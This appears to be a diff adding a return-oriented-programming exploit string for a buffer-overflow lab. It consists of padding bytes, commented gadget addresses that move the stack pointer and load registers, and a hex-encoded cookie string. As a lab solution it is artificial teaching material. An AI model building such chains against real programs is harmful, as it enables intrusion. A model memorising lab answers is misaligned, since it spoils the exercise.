@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d3 14 40 00 00 00 00 00	// gadget addr. mov rsp into rax
+a4 14 40 00 00 00 00 00 // gadget addr. for mov %rax; %rdi; 
+99 14 40 00 00 00 00 00 // gadget addr. for pop %rax; 0x401499
+40 00 00 00 00 00 00 00 // pop 0x40 into rax (offset needed to get to our string mem. addr.)
+55 15 40 00 00 00 00 00 // gadget addr. for mov %eax to %edx; 0x00401555
+6e 15 40 00 00 00 00 00
+03 15 40 00 00 00 00 00
+cd 14 40 00 00 00 00 00
+a4 14 40 00 00 00 00 00
+f9 13 40 00 00 00 00 00
+37 38 33 63 64 32 64 64
